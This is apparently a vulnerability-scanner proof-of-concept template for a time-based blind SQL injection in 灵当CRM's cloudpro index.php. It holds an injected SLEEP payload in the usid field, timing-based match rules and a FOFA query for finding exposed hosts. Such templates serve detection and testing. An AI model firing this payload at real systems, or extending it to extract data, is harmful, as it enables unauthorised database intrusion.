id: poc-yaml-51mis-crm-cloudproindex-sqli
info:
  name: 灵当CRM cloudproindex SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 灵当CRM
  fofa: body="http://localhost:8088/crm/index.php"
variables:
  t1: random_int(2,5)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: POST
  path: /crm/WeiXinApp/cloudpro/index.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=getMyAccount&usid=1 AND (SELECT 5120 FROM (SELECT(SLEEP({{.t1}})))nmLt)
  expression: 'status_code == 200 &&

    contains(body,"search_reminds") &&

    contains(body,"success") &&

    !contains(body,"<") &&

    duration > t2 &&

    duration < t3

    '
transport: http
